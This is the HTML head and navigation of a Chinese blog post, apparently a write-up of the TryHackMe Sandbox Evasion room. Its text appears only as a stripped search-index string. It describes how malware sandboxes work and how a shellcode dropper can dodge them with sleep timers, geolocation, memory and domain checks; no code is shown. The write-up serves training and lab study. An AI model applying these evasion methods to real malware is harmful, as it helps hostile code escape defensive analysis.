<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-沙盒规避 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-沙盒规避"><meta name="application-name" content="THM-沙盒规避"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-沙盒规避"><meta property="og:url" content="http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="了解蓝队人员可以部署的主动防御机制，以识别其环境中的对手。 0x01 介绍 欢迎来到沙盒规避 Lots of companies deploy a “Defense in Depth” strategy, which refers to implementing security in layers"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="了解蓝队人员可以部署的主动防御机制，以识别其环境中的对手。 0x01 介绍 欢迎来到沙盒规避 Lots of companies deploy a “Defense in Depth” strategy, which refers to implementing security in layers"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-沙盒规避',
  postAI: '',
  pageFillDescription: '0x01 介绍, 学习目标, 房间先决条件, 0x02 敌人陷入 Sandbox, 什么是恶意软件分析, 静态与动态分析, 沙盒简介, 0x03 常见 Sandbox 规避技术, 沙盒规避简介, Sandbox睡眠, 地理定位, 查看系统信息, 查询网络信息, 搭建舞台, 0x04 执行各种规避技术, 深入研究沙盒规避, Taking a Nap, 地理位置过滤, 查看系统信息, 检查系统内存, 查询网络信息, Visual Studio 中添加外部依赖项, 总结实施, 0x05 DIY 沙箱规避挑战, 大逃亡, 沙盒规避二进制文件, 0x06 总结了解蓝队人员可以部署的主动防御机制以识别其环境中的对手介绍欢迎来到沙盒规避许多公司部署了纵深防御策略即分层实施安全性因此如果一层失败对手就必须躲避另一层在这个房间里我们将重点讨论一种独特的主动防御类型沙箱沙箱提供了一种安全的方法来分析潜在的恶意文件并观察对系统的影响并返回可执行文件是否恶意学习目标在这个房间里我们将深入了解沙箱当您完成本课程时您将对以下主题有更好的理解了解恶意软件沙箱的工作原理了解静态和动态恶意软件分析常见的沙箱规避方法使用开发和测试沙箱规避方法房间先决条件对于此房间我们建议您具有以下方面的经验敌人陷入什么是恶意软件分析恶意软件分析是分析可疑文件的过程以确定它在微观层面通过查看程序集和宏观层面通过查看它在系统上的行为的行为此过程使蓝队成员可以更好地了解恶意程序这可以帮助他们开发检测静态与动态分析蓝队成员可以通过两种方式分析可疑文件一种方法是使用或等反汇编程序在微观层面上查看代码如前所述这个过程被称为静态分析另一方面我们可以通过称为动态分析的过程观察可疑文件在系统上执行时会发生什么系统上通常会安装许多分析工具例如和调试器例如等等沙盒简介蓝队成员提出的分析可疑文件的最有创意和最有效的方法之一是动态分析此方法涉及在容器化或虚拟化环境中运行文件该环境称为沙箱根据选择的沙箱您可以自定义运行的版本计算机上安装的软件等等沙箱提供了一种安全有效的方法来监视可疑文件在生产系统上运行或允许将其发送到生产系统之前的行为网络的各个部分可能存在许多商业沙箱在上图中存在三个不同的沙箱在企业环境中存在一个两个甚至三个沙箱的情况并不少见通常您可能会在以下位置找到它们防火墙邮件服务器工作站每个沙箱的工作方式可能不同例如防火墙可以执行电子邮件中的附件并查看发生何种类型的网络通信而邮件沙箱可以打开电子邮件并查看电子邮件中的嵌入文件是否触发通过等协议进行下载以尝试窃取哈希值基于主机的防病毒沙箱可以在其中执行该文件并监视恶意编程行为或对系统的更改有许多供应商生产各种沙盒产品蓝队成员可以将其部署在企业网络中以下是一些流行的例子电子邮件沙箱工作站电子邮件沙箱样本提交网站样本提交网站样本提交网站样本提交网站在下一节中我们将了解恶意软件作者通常部署的各种技术以了解现有的一些规避技术我们提供了一个开发虚拟机您可以在其中开发自己的沙盒规避技术您可以使用以下凭据访问虚拟机常见规避技术沙盒规避简介现在您已经大致了解了什么是恶意软件沙箱我们可以继续学习一些高层次的规避技术我们将其分为四个不同的类别在下一个任务中我们将实施四种不同的规避技术每个类别一种因此您可以在离开这个房间时掌握一些实用知识来帮助您的红队行动我们将涵盖以下四大类在睡眠地理定位和地理封锁查看系统信息查询网络信息这些技术按从最基本的技术到最先进的顺序排列让我们开始吧睡眠恶意软件沙箱通常会受到时间限制以防止资源过度分配这可能会急剧增加沙箱队列这是我们可以滥用的一个重要方面如果我们知道沙箱在任何给定时间只会运行五分钟我们可以实现一个睡眠计时器在执行之前睡眠五分钟这可以通过多种方式完成一种常见的方法是查询当前系统时间并在并行线程中检查并查看已经过去了多少时间五分钟过去后我们的程序就可以开始正常执行了另一种流行的方法是进行复杂的计算量大的数学运算这可能需要一定的时间例如计算斐波那契数列达到给定的数字请记住根据系统的硬件执行此操作可能需要或多或少的时间屏蔽您的应用程序通常是避免反病毒检测的好主意因此这应该已经包含在您的工具包中请注意某些沙箱可能会改变内置的睡眠功能各种反病毒供应商都发表了有关绕过内置睡眠功能的博客文章所以强烈建议您开发自己的睡眠功能以下是一些关于绕过睡眠功能的博客文章地理定位沙箱的一个决定性因素是它们通常位于外部并由反病毒提供商托管如果您知道自己正在攻击一家欧洲公司并且您的二进制文件是在加利福尼亚州执行的那么您可以做出有根据的猜测该二进制文件最终进入了沙箱您可以选择在程序上实施地理位置过滤器检查地址块是否属于您所定位的公司所有或者是否来自住宅地址空间您可以使用多种服务来检查此信息可用于检索您当前的地址其他信息是可选的将此与的相结合您可以确定以易于解析的格式返回的需要注意的是此方法仅在主机可以访问互联网的情况下才有效某些组织可能会构建特定域的阻止列表因此您应该确定此方法适用于您尝试利用此方法的组织查看系统信息另一种非常流行的方法是观察系统信息大多数沙箱的资源通常会减少流行的恶意软件沙盒服务仅为每个虚拟机分配个核心和网络中的大多数工作站通常具有个内核和驱动器空间这很大程度上取决于您所针对的组织但一般来说您可以期望每个系统有超过个核心和超过的了解这一点后我们可以定制代码来查询基本系统信息核心数数量磁盘大小等这绝不是一个详尽的列表但这里有一些您可以过滤的其他示例存储介质序列号电脑主机名版本序列号产品密钥操作系统版本网络适配器信息虚拟化检查当前登录用户还有更多查询网络信息最后一种方法是我们将要介绍的最开放的方法由于其开放性它被认为是更高级的方法之一因为它涉及查询有关域的信息几乎没有恶意软件沙箱加入域中因此可以相对安全地假设如果计算机未加入域则它不是正确的目标但是您不能总是太确定因此您应该收集一些有关域的信息以确保安全您可以查询的对象有很多以下是一些需要考虑的因素计算机用户帐户最后用户登录组域管理员企业管理员域控制器服务账户域名服务器这些技术的难度各不相同因此您应该考虑要花费多少时间和精力来构建这些规避方法一个简单的方法例如检查或等项目的系统环境变量这可以使用完成或者显示所有变量使用命令可能比实现搭建舞台现在您已经更好地了解了存在哪些沙盒绕过方法类型我们将进入下一步并在下一个任务中实现一些沙盒绕过在继续下一个任务之前我们将从一个基本的开始它从服务器特别是检索并将其注入内存然后执行需要注意的是所有都必须使用以原始格式生成并且必须是位而不是位可以使用以下命令生成然后应通过任何服务器托管在上的模块具有高度可移植性和灵活性将作为此任务的良好基础在现实世界中您可以将托管在服务器上出于本实验的目的我们将使用没有服务器的此任务附加的代码已使用或更高版本进行测试和编译下载并打开它请务必注意第和行中有多个占位符值您必须更新这些占位符值才能使代码正常运行更改这些值后编译位版本的代码执行各种规避技术深入研究沙盒规避获取此基本代码后我们将迈出进入沙盒规避世界的第一步我们将从睡眠开始因为这是最简单的我们可以从上一个任务中获取模板代码并向其中添加一条的语句这相当于大约秒或分钟一般来说您需要接近分钟的时间才能确定不过对于测试目的来说分钟就足够了我们现在将在主函数中添加语句完成此操作后我们可以编译代码并将其上传到您可以阅读以下测试并通过链接查看它们在上的行为这将作为我们沙盒规避的测试场因为它为我们提供了非常详细的信息回顾两次运行并排查看两个结果我们注意到运行中没有发生任何活动在我们的非休眠运行中我们可以看到请求发送到恭喜我们已经成功创建了第一个沙盒规避技术虽然这是一项简单的技术但它的功能却非常强大使我们能够用完的一分钟计时器正如上一个任务中所述此方法可能有效也可能无效因为已发布的各种博客文章显示蓝队可以创建睡眠计时器旁路更好的实现方式是通过大量的数学运算来浪费计算时间地理位置过滤转向我们在沙箱上逃避执行的下一个方法我们将利用地理位置块幸运的是我们将能够利用大量已经为我们编写的代码为此可以重复使用函数的部分内容我们将重用以下组件网站以前的变量以前的流变量字符串变量以前的变量缓冲区空间以前称为变量读取字节数以前称为变量最后函数将其集成到我们的代码中这转化为一个看起来像这样的实际函数该代码可以分为以下步骤声明上面提到的所需变量使用函数打开的互联网流以检查当前的地址将函数返回的数据流写入内存将内存缓冲区中的数据附加到字符串变量检查字符串数据是否等于受害者的地址如果为则返回如果为则返回现在我们必须修改我们的函数以便我们可以利用新创建的函数上面的代码调用新函数如果地址返回则调用函数从我们的服务器调用如果为则返回我是一个茶壶测试我们的代码现在我们已经完成了第二个沙盒规避技术了解这是威胁行为者使用的极其常见的非常重要和红队都经常使用服务来检查地址的滥用信息以收集有关地址的信息以确定其是否是合法公司非常了解这种反沙盒技术甚至在我们的实例中对其进行了标记您可以在以下链接中查看详细结果查看这两个结果我们可以看到被标记为可疑潜在恶意站点用于检查您的外部地址事实上这种沙盒规避方法最终损害了我们的分数因此它应该用作最后的手段或与最近部署自定义地址检查服务器一起使用完整的报告可以在这里找到正如您现在所知并非所有沙箱转义技术在某些情况下都可能有帮助您必须仔细挑选要实施的规避技术因为有些技术可能弊大于利查看系统信息我们将从系统信息类别开始系统拥有的量请务必注意以非标准格式测量数据如果你曾经购买过一台声称拥有存储空间的电脑那么在打开它之后你的存储空间将接近这是因为以字节为单位而不是字节来测量数据请注意这很快就会变得非常混乱对我们来说幸运的是我们将在如此少量的内存中工作以至于准确性可以是最佳猜测而不是确切的数字现在我们知道了这一点我们如何确定系统上安装了多少内存检查系统内存幸运的是这是一个相对容易发现的事情我们只需要包含头文件就可以调用特定的来为我们检索数据要获取此信息我们必须声明结构然后我们必须将成员的大小设置为结构的大小完成后我们可以调用以使用内存信息填充该结构在这种情况下我们对系统上安装的物理内存总量特别感兴趣因此我们将打印结构体的成员以获取系统中安装的内存大小以字节为单位然后我们可以除以以获得安装的内存值以为单位现在让我们看看这在中是什么样子的将其集成到我们的代码中现在我们已经掌握了技术知识我们应该将此检查集成到我们的代码中一般来说您应该自己验证这一点大多数沙箱都有专用于机器的因此我们应该检查内存数是否大于如果不是则退出程序如果是则继续执行我们将不再修改函数从现在开始我们将添加新功能并更改主要功能该代码可以分为以下步骤我们正在创建一个新函数它将返回或我们使用上面的代码来获取系统内存的大小我们检查系统内存是否大于如果为真我们返回如果为假我们返回函数返回的值决定我们是否下载并执行阶段测试我们的代码现在我们已经完成了第三种沙盒规避方法中的第二种重要的是我们对其进行测试以确保其有效为此我们将文件上传到排查两个样本会发现一些有趣的差异在第一次提交中我们的内存检查功能工作正常没有任何问题并在发现设备的小于时优雅地退出程序在我们未经修改的原始代码中我们可以看到请求发送到服务器以获取第二阶段这表明我们的代码按预期运行现在我们可以继续讨论最后的绕过类别之一查询网络信息查询网络信息对于我们的最后一种规避技术我们将查询有关域的信息我们将通过使用查询域控制器的名称来保持简单这是一个相对简单的用于获取环境中的主域控制器这要求我们指定一个指向要放入的名称的字符串的指针在中实现该函数如下所示该代码可以分为以下步骤声明两个变量一个字符串一个仅返回调用将指定两个空值因为我们不知道我们可能所处环境的服务器名称或域名我们将转换为普通字符串变量以检查该值是否为或者如果是字符串则为执行比较语句并根据设备名称返回或然后这将回调函数该函数将评估是否需要从服务器下载并执行我们的函数现在看起来像这样测试我们的代码对于我们最后的沙盒分析我们将使用查看的结果我们可以看到我们的规避技术有效未向发出出站请求中添加外部依赖项对于最终的规避方法我们必须在项目文件中添加一个新的为此请确保首先打开您的项目打开后在解决方案资源管理器中右键单击项目名称在下图中项目名称称为单击列表底部的属性这将打开一个新的视野展开链接器选项卡并选择输入子菜单我们有兴趣添加库为此请单击右侧引用的所有库并添加添加后如上面的屏幕截图所示按应用按钮和确定关闭窗口您就可以继续开发了总结实施现在您已经更熟悉了各种沙盒规避技术的实施我们将在下一个任务中继续进行沙盒规避挑战您将需要将多个旁路集成在一起以逃避自定义沙箱所有源代码均已完整提供以帮助那些可能不熟悉的人沙箱规避挑战大逃亡现在您已经获得了一些逃离沙盒的经验是时候接受挑战了在本任务中您将利用任务中的代码来实现终极沙盒逃避方法来逃避的沙盒程序为了逃离沙盒您必须实施以下技术检查设备是否已加入域检查系统内存是否大于实施到的出站请求在从服务器检索负载之前实施秒睡眠计时器如果您的滴管满足上述要求则会向您打印该标志祝你好运玩得开心提醒一下任务包含四个示例中的可下载源代码可以帮助您使用沙盒规避技术此材料也可以在虚拟机上的中找到沙盒规避技术可能会失败该程序分析二进制文件以查看是否执行了检查出站设备可能无法访问互联网只要执行检查沙箱检查就应该成功沙盒规避二进制文件当您完成的开发并准备好测试您的规避方法时您可以在中找到二进制文件来检查您的植入程序下面是一个向您展示该程序如何工作的示例回答以下问题使用任务中的代码片段和虚拟机作为参考创建您自己的沙盒规避可执行文件在命令提示符下运行上面的示例提供可执行文件作为参数所有检查必须正确执行才能显示标志注意如果您做得正确睡眠检查将需要大约一分钟的时间才能显示该标志注意如果您的检查有而不是那么您的睡眠检查可能会遇到困难最终文件代码为总结在这个房间中我们介绍了一些现代和历史上的沙盒规避技术这些技术已被红队成员和高级威胁行为者所使用完成这个房间后您现在应该大致了解什么是恶意软件沙箱可以尝试用来规避它的方法甚至是可以构建的一些模板代码这绝不是所有沙盒规避方法的完整列表我们强烈鼓励您利用从这个房间学到的基础知识来开发自己的沙盒规避技术',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-21 20:37:04',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 